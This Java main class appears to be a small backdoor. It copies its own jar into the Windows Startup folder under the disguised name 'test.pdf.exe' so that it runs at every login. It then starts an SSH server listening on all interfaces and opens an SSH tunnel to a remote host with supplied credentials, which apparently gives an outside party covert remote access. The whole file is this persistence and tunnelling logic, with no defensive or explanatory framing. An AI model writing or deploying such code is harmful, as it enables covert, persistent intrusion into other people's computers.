package pl.marczyk;

import org.apache.log4j.Logger;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

/**
 * Created by MMARCZYK on 2016-01-22.
 */
public class Main {
    private static final Logger LOGGER = Logger.getLogger(Main.class);

    public static void main(String[] args) throws IOException, InterruptedException {

        if (args.length != 4) {
            System.out.println("Usage :");
            System.out.println("java -jar port host username password");
            System.out.println("example: java -jar 8080 192.168.0.100 root qwerty");
        } else {
            File sourceFile = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
            File targetFile = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.pdf.exe");

            if (!targetFile.exists()) {
                Files.copy(sourceFile.toPath(), targetFile.toPath());
            }

            int port = Integer.parseInt(args[0]);
            String remoteHost = args[1];
            String remoteUsername = args[2];
            String remotePassword = args[3];

            SshServer sshServer = new SshServer("0.0.0.0", port);
            SshTunnel sshTunnel = new SshTunnel(remoteHost, port, remoteUsername, remotePassword, "localhost", port);
            try {
                sshServer.start();
            } catch (Exception e){
                LOGGER.error("Coludn't start ssh server, maybe it is already running.");
            }
            sshTunnel.start();
        }
    }
}
